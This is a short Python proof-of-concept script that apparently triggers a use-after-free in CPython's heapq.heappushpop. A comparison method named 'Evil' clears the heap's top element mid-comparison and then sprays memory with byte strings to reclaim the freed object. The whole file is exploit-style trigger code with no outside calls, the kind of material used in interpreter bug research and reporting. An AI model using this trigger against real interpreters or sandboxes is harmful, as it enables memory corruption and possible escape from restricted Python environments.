import heapq
import sys

class Evil:
    def __lt__(self, other):
        print('In Evil.__lt__')
        print('heap[0] refcount before clear:', sys.getrefcount(heap[0]))
        heap[0] = None
        print('heap[0] refcount after clear:', sys.getrefcount(heap[0]))
        
        # Spray
        global spray
        spray = [b'A'*40 for _ in range(100)]
        
        return False

# top is a tuple!
top = (Evil(),)
heap = [top]

print('Calling heappushpop...')
try:
    heapq.heappushpop(heap, (0,))
except Exception as e:
    print('Exception:', e)
print('Done')
